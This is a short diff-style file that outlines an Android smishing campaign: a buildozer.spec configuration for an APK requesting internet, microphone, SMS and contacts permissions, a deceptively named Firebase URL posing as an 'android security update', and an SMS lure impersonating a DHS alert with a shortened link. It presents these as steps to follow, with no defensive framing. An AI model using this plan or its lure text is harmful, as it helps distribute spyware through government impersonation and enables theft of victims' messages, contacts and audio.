@@ -1,0 +1,12 @@
+Build Apk with (modified buildozer.spec)
+requirements =
+python3, requests, pycryptodome  
+android.permissions = INTERNET, RECORD_AUDIO, READ_SMS, READ_CONTACTS  
+
+Host a Firebase/Github with believable URL
+https://android-security-update[.]firebaseapp.com  
+
+Send SMS
+[DHS Alert] Mandatory security patch for your device:  
+bit.ly/android-sec-update  
+
